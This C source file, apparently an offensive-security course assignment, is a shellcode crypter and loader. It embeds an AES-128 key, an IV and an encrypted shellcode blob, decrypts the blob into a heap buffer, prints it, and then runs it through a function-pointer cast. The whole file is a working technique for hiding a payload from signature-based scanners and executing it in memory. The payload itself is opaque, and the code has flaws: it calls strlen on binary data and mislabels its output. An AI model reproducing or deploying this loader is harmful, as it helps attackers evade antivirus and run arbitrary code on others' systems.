#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define CBC 1
#include "aes.h"

// AES encryption Key:
unsigned char aes_key[] =
	"\x00\x6c\x61\x65\x5f\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x37";

// AES Encrypted Shellcode:
unsigned char enc_shellcode[] = \
	"\x46\x50\x01\x27\x09\x5d\x4a\xb8\xc3\x5f\x50\xbf\x72\xe2\xa2\xda\xd1\x14\x23\x9e\x36\xc5\x76\xf4\x9f\x22\xae\x77\x08\xe4\x7a\x07\x38\x56\xf9\x59\x94\x69\x5b\x2e\x87\x6b\x14\xbc\x80\xa9\xfb\xbb\x92\x19\x8c\xb2\x2e\xc6\x97\xcd\xff\x57\x57\xaa\x79\xfa\x95\xcc";

int main(int argc, char **argv)
{
  uint8_t iv[]  = { 0xFC, 0xBA, 0x11, 0xEF, 0x99, 0x8C, 0x1A, 0xC7, 0xEE, 0xD9, 0x51, 0x64, 0x9D, 0xFA, 0x55, 0xAA };

	unsigned char * dst_buffer = malloc(strlen(enc_shellcode));
	unsigned char decrypted_byte;

	int (*ret)() = (int(*)())dst_buffer;

	printf("Decrypting Shellcode...\n\n");

	for (int offset=0; offset < strlen(enc_shellcode);offset+=16)
	{
		if (offset == 0)
			AES128_CBC_decrypt_buffer(dst_buffer+offset, enc_shellcode+offset, 16, aes_key, iv);
		else
			AES128_CBC_decrypt_buffer(dst_buffer+offset, enc_shellcode+offset, 16, 0, 0);
	}

        printf("AES Encrypted Shellcode:\n");
        for (int counter=0; counter < strlen(dst_buffer); counter++)
        {
                decrypted_byte = dst_buffer[counter];
                printf("\\x%02x", decrypted_byte);
        }
	printf("\n");

	printf("Here's the decrypted Shellcode...\n\n");

	ret();
	free(dst_buffer);

	return 0;
}
